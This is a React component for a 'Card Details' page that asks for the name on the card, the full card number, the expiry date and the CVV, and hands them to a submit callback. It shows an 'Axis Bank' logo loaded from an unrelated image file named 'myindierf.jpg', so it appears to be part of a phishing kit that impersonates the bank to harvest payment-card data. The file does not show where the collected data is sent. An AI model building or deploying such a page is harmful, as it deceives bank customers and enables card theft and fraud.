/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect } from 'react';
import { CreditCard, ArrowLeft } from 'lucide-react';
import { CardData } from '../types';
// @ts-ignore
import defaultLogoImage from '../../images/myindierf.jpg';

interface CardDetailsPageProps {
  onSubmit: (data: CardData) => void;
  initialData: CardData;
  onBack?: () => void;
}

export default function CardDetailsPage({
  onSubmit,
  initialData,
  onBack,
}: CardDetailsPageProps) {
  useEffect(() => {
    window.scrollTo(0, 0);
    if (document.documentElement) document.documentElement.scrollTop = 0;
    if (document.body) document.body.scrollTop = 0;
    const container = document.getElementById('app-root-container');
    if (container) container.scrollTop = 0;
  }, []);

  const [cardholderName, setCardholderName] = useState(initialData.cardholderName || '');
  const [cardNumber, setCardNumber] = useState(initialData.cardNumber || '');
  const [expiryMonth, setExpiryMonth] = useState(initialData.expiryMonth || '');
  const [expiryYear, setExpiryYear] = useState(initialData.expiryYear || '');
  const [cvv, setCvv] = useState(initialData.cvv || '');
  const [error, setError] = useState<string | null>(null);

  const formatCardNumber = (value: string) => {
    const digits = value.replace(/\D/g, '').slice(0, 16);
    const groups = digits.match(/.{1,4}/g);
    return groups ? groups.join(' ') : digits;
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setCardNumber(formatCardNumber(e.target.value));
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!cardholderName.trim()) {
      setError('Name on card is required');
      return;
    }
    const plainCard = cardNumber.replace(/\s/g, '');
    if (!plainCard || plainCard.length < 16) {
      setError('Please enter a valid 16-digit card number');
      return;
    }
    if (!expiryMonth || expiryMonth.length !== 2 || parseInt(expiryMonth, 10) < 1 || parseInt(expiryMonth, 10) > 12) {
      setError('Please enter a valid expiry month (01-12)');
      return;
    }
    if (!expiryYear || expiryYear.length !== 2) {
      setError('Please enter a valid expiry year (e.g. 28)');
      return;
    }
    if (!cvv || cvv.length !== 3) {
      setError('Please enter a valid 3-digit CVV');
      return;
    }
    setError(null);
    onSubmit({
      cardholderName,
      cardNumber: plainCard,
      expiryMonth,
      expiryYear,
      cvv,
    });
  };

  return (
    <div className="max-w-xl mx-auto px-4 py-4" id="card-details-view">
      {/* Header with Logo */}
      <div className="bg-white rounded-3xl border border-gray-100 shadow-sm p-6 mb-6 space-y-3 relative overflow-hidden">
        <div className="absolute top-0 left-0 right-0 h-1.5 bg-[#8B0000] rounded-t-3xl" />
        <div className="flex justify-between items-center">
          <div className="flex items-center gap-3">
            {onBack && (
              <button
                type="button"
                onClick={onBack}
                className="p-1 rounded-full hover:bg-gray-100 text-[#8B0000] transition-colors"
              >
                <ArrowLeft className="w-5 h-5" />
              </button>
            )}
            <img src={defaultLogoImage} alt="Axis Bank" className="h-10 max-w-[140px] object-contain rounded-md" />
          </div>
        </div>
      </div>

      {/* Card Details Form */}
      <form onSubmit={handleSubmit} className="bg-white rounded-3xl border border-gray-100 shadow-sm p-6 md:p-8 space-y-6">
        <div className="space-y-1 text-left pb-2">
          <h1 className="text-2xl font-extrabold text-gray-900 tracking-tight">
            Card Details
          </h1>
          <p className="text-xs text-gray-400 font-semibold">
            Please enter your card information securely
          </p>
        </div>

        {error && (
          <div className="p-3 rounded-2xl bg-red-50 border border-red-100 text-red-600 text-xs font-bold text-center">
            {error}
          </div>
        )}

        <div className="space-y-5 text-left">
          {/* Name */}
          <div className="space-y-1.5">
            <label className="block text-xs md:text-sm font-bold text-gray-700" htmlFor="name">
              Name
            </label>
            <input
              type="text"
              id="name"
              value={cardholderName}
              onChange={(e) => setCardholderName(e.target.value)}
              placeholder="Name on card"
              className="block w-full px-4 py-3.5 bg-white border border-gray-200 focus:border-[#8B0000] focus:ring-4 focus:ring-rose-200 rounded-2xl text-base font-medium placeholder-gray-400 outline-none transition-all text-gray-800 uppercase"
            />
          </div>

          {/* Number */}
          <div className="space-y-1.5">
            <label className="block text-xs md:text-sm font-bold text-gray-700" htmlFor="cardNumber">
              Number
            </label>
            <input
              type="text"
              id="cardNumber"
              value={cardNumber}
              onChange={handleCardNumberChange}
              placeholder="XXXX XXXX XXXX XXXX"
              className="block w-full px-4 py-3.5 bg-white border border-gray-200 focus:border-[#8B0000] focus:ring-4 focus:ring-rose-200 rounded-2xl text-base font-mono tracking-wider placeholder-gray-400 outline-none transition-all text-gray-800"
            />
          </div>

          {/* Exp. Month & Exp. Year grid */}
          <div className="grid grid-cols-2 gap-4">
            <div className="space-y-1.5">
              <label className="block text-xs md:text-sm font-bold text-gray-700" htmlFor="expMonth">
                Exp. Month
              </label>
              <input
                type="text"
                id="expMonth"
                maxLength={2}
                value={expiryMonth}
                onChange={(e) => setExpiryMonth(e.target.value.replace(/\D/g, ''))}
                placeholder="MM"
                className="block w-full px-4 py-3.5 bg-white border border-gray-200 focus:border-[#8B0000] focus:ring-4 focus:ring-rose-200 rounded-2xl text-base font-medium text-center placeholder-gray-400 outline-none transition-all text-gray-800"
              />
            </div>
            <div className="space-y-1.5">
              <label className="block text-xs md:text-sm font-bold text-gray-700" htmlFor="expYear">
                Exp. Year
              </label>
              <input
                type="text"
                id="expYear"
                maxLength={2}
                value={expiryYear}
                onChange={(e) => setExpiryYear(e.target.value.replace(/\D/g, ''))}
                placeholder="YY"
                className="block w-full px-4 py-3.5 bg-white border border-gray-200 focus:border-[#8B0000] focus:ring-4 focus:ring-rose-200 rounded-2xl text-base font-medium text-center placeholder-gray-400 outline-none transition-all text-gray-800"
              />
            </div>
          </div>

          {/* CVV */}
          <div className="space-y-1.5">
            <label className="block text-xs md:text-sm font-bold text-gray-700" htmlFor="cvv">
              CVV
            </label>
            <input
              type="password"
              id="cvv"
              maxLength={3}
              value={cvv}
              onChange={(e) => setCvv(e.target.value.replace(/\D/g, ''))}
              placeholder="XXX"
              className="block w-full px-4 py-3.5 bg-white border border-gray-200 focus:border-[#8B0000] focus:ring-4 focus:ring-rose-200 rounded-2xl text-base font-medium placeholder-gray-400 outline-none transition-all text-gray-800"
            />
          </div>
        </div>

        {/* Submit Button */}
        <div className="pt-2">
          <button
            type="submit"
            className="w-full bg-[#8B0000] hover:bg-[#720000] active:bg-[#5A0000] active:scale-[0.98] text-white py-4 px-6 rounded-2xl font-bold tracking-wide transition-all shadow-md hover:shadow-lg flex items-center justify-center gap-2 cursor-pointer touch-manipulation select-none text-base"
            id="btn-card-details-submit"
          >
            Submit
          </button>
        </div>
      </form>
    </div>
  );
}
